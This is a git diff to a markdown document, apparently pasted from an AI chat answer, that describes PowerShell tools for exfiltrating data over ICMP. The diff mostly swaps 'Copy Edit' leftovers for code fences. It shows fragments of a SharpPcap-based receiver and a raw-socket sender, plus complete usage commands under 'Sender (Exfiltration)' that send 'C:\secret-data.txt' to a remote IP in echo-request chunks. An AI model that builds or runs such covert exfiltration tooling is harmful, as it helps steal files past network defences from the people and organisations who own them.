@@ -237,9 +237,7 @@ This script:
 Uses SharpPcap for efficient packet capture.
 Parses ICMP payloads and writes to file.
 Recognizes "icmp exfil has completed" as the end of the transfer.
-powershell
-Copy
-Edit
+```
 param (
     [string]$source,   # Expected sender IP
     [string]$file      # Destination file to save received data
@@ -338,15 +336,14 @@ function Receive-ICMPFile {
 }
 
 Receive-ICMPFile
+```
 Updated PowerShell ICMP Sender (Invoke-IcmpUpload)
 This script:
 
 Reads a file in chunks.
 Sends data via ICMP echo requests.
 Uses raw sockets for transmission.
-powershell
-Copy
-Edit
+```
 param (
     [string]$destination,  # Target IP
     [string]$file,         # File to send
@@ -398,6 +395,7 @@ function Send-ICMPFile {
 }
 
 Send-ICMPFile
+```
 Key Improvements:
 ✅ Uses SharpPcap for ICMP Packet Capture
 ✅ Applies BPF filtering to capture only ICMP packets from the specified sender
@@ -410,15 +408,12 @@ Key Improvements:
 Receiver (Target Machine)
 Run this first to capture incoming file transfers:
 
-powershell
-Copy
-Edit
+
 .\Receive-ICMPFile.ps1 -source "192.168.1.200" -file "C:\received.txt"
 Sender (Exfiltration)
+
 Run this to send a file over ICMP:
 
-powershell
-Copy
-Edit
+
 .\Send-ICMPFile.ps1 -destination "192.168.1.100" -file "C:\secret-data.txt" -blockSize 1000 -verbose
 
